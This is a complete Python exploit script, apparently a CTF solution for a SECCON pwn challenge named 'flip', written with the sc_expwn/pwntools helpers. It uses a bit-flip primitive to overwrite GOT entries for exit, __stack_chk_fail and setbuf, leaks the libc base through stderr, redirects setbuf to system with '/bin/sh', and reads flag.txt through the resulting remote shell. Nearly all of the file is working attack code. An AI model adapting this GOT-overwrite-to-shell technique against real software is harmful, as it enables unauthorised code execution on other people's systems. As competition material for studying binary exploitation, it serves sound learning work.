#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './flip'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

default_target = {'host':'target', 'port':4296}

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = default_target, \
                        monitor = {'host':os.environ['SECCON_HOST'] if 'SECCON_HOST' in os.environ else default_target['host'], \
                                   'port':int(os.environ['SECCON_PORT']) if 'SECCON_PORT' in os.environ else default_target['port']})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so', \
                        monitor = 'libc-2.27.so')
env.select('monitor')

#==========

binf = ELF(bin_file)
addr_got_exit       = binf.got['exit']
addr_got_stack_chk  = binf.got['__stack_chk_fail']
addr_got_setbuf     = binf.got['setbuf']
addr_plt_exit       = binf.plt['exit']
addr_plt_stack_chk  = binf.plt['__stack_chk_fail']
addr_start          = binf.sep_function['_start']
addr_main           = binf.sep_function['main']
addr_stderr         = binf.symbols['stderr']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_setbuf      = libc.sep_function['setbuf']
offset_libc_puts        = libc.sep_function['puts']
offset_libc_stderr      = libc.symbols['_IO_2_1_stderr_']

#==========

def attack(conn, **kwargs):
    flip_byte(conn, addr_got_exit, ((addr_plt_exit+6) ^ (addr_start+6)) & 0xff)
    flip_byte(conn, addr_got_exit, 6)

    flip_qword(conn, addr_got_stack_chk, (addr_plt_stack_chk+6) ^ addr_main)

    flip_byte(conn, addr_got_exit, (addr_start ^ addr_plt_stack_chk) & 0xff)

    flip_byte(conn, addr_stderr, 8)
    flip_qword(conn, addr_got_setbuf, offset_libc_setbuf ^ offset_libc_puts)

    flip_byte(conn, addr_got_exit, (addr_start ^ addr_plt_stack_chk) & 0xff)

    conn.recvuntil('\n')
    conn.recvuntil('\n')
    addr_libc_stderr = u(conn.recvuntil('\n', drop=True)) - 0x83
    libc.address = addr_libc_stderr - offset_libc_stderr
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_puts      = libc.sep_function['puts']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    flip_byte(conn, addr_got_exit, (addr_start ^ addr_plt_stack_chk) & 0xff)

    flip_qword(conn, addr_got_setbuf, addr_libc_puts ^ addr_libc_system)
    flip_qword(conn, addr_stderr, (addr_libc_stderr+8) ^ addr_libc_str_sh)

    flip_byte(conn, addr_got_exit, (addr_start ^ addr_plt_stack_chk) & 0xff)

def flip_byte(conn, addr, flips):
    assert(flips < 0x100)

    conn.sendlineafter('address >> ', str(addr))

    n_flip = 0
    for i in range(8):
        if (flips >> i) & 1:
            conn.sendlineafter(') >> ', str(i))
            n_flip += 1
            flips ^= 1 << i
        if n_flip > 1:
            break

    if flips:
        flip_byte(conn, addr, flips)
    elif n_flip < 2:
        conn.sendlineafter(') >> ', '-1')

def flip_qword(conn, addr, flips):
    for i in range(8):
        if flips & 0xff:
            flip_byte(conn, addr + i, flips & 0xff)
        flips >>= 8

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline('exec 2>&1')
    sleep(0.1)
    conn.sendline('echo FLAG_HERE; cat flag.txt')
    conn.recvuntil('FLAG_HERE\n')
    print('FLAG : {}'.format(conn.recvuntil('\n', drop=True)))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    main()

#==========
